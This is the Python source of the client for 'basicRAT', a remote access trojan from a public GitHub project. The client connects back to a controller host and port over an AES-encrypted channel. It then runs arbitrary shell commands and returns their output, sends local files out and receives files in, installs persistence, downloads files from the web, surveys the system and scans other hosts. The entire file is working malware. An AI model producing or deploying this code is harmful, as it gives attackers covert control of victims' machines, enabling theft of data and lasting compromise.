#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import subprocess
import struct
import sys

from core import common
from core import crypto
from core import filesock
from core import persistence
from core import scan
from core import survey
from core import toolkit


PLAT_TYPE = sys.platform
HOST      = 'localhost'
PORT      = 1337
FB_KEY    = '82e672ae054aa4de6f042c888111686a'
# generate your own key with...
# python -c "import binascii, os; print(binascii.hexlify(os.urandom(16)))"


def main():
    s = socket.socket()
    s.connect((HOST, PORT))

    dh_key = crypto.diffiehellman(s)

    while True:
        data = s.recv(1024)
        data = crypto.AES_decrypt(data, dh_key)

        # seperate prompt into command and action
        cmd, _, action = data.partition(' ')

        # stop client
        if cmd == 'kill':
            s.close()
            sys.exit(0)

        # run command
        elif cmd == 'run':
            results = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            results = results.stdout.read() + results.stderr.read()
            s.sendall(crypto.AES_encrypt(results, dh_key))

        # send file
        elif cmd == 'download':
            for fname in action.split():
                fname = fname.strip()
                filesock.sendfile(s, fname, dh_key)

        # receive file
        elif cmd == 'upload':
            for fname in action.split():
                fname = fname.strip()
                filesock.recvfile(s, fname, dh_key)

        # regenerate DH key
        elif cmd == 'rekey':
            dh_key = crypto.diffiehellman(s)

        # apply persistence mechanism
        elif cmd == 'persistence':
            results = persistence.run(PLAT_TYPE)
            s.send(crypto.AES_encrypt(results, dh_key))

        # download a file from the web
        elif cmd == 'wget':
            results = toolkit.wget(action)
            s.send(crypto.AES_encrypt(results, dh_key))

        # unzip a file
        elif cmd == 'unzip':
            results = toolkit.unzip(action)
            s.send(crypto.AES_encrypt(results, dh_key))

        # run system survey
        elif cmd == 'survey':
            results = survey.run(PLAT_TYPE)
            s.send(crypto.AES_encrypt(results, dh_key))

        # run a scan
        elif cmd == 'scan':
            results = scan.single_host(action)
            s.send(crypto.AES_encrypt(results, dh_key))


if __name__ == '__main__':
    main()
